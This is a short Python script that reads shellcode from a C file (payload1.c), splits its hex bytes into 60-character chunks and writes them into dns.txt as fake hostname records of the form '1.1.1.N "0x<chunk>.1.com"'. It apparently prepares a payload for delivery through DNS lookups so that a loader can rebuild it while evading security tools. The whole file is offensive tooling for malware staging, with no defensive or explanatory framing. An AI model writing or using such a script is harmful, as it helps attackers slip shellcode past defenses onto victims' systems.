# -*- coding: UTF-8 -*-
import re
f = open("payload1.c", "rb")
def cut_text(text,lenth):
    textArr = re.findall('.{'+str(lenth)+'}', text)
    textArr.append(text[(len(textArr)*lenth):])
    return textArr

a = f.readlines()[1:2]
b = "0" + str(a).replace("[b'unsigned char buf[] = ","").strip("\";\\n']").replace("\\\\","0")
shell_list = cut_text(b,60)

fn = open("dns.txt", "wb")
for lines in range(len(shell_list)):
    ipls = '1.1.1.%s' % lines
    #print(ipls)
    shellcode = ipls + " " + '"'+ "0x"+shell_list[lines]+".1.com"+'"'
    #print(type(shellcode))
    shellcode = shellcode +"\n"
    fn.write(shellcode.encode())
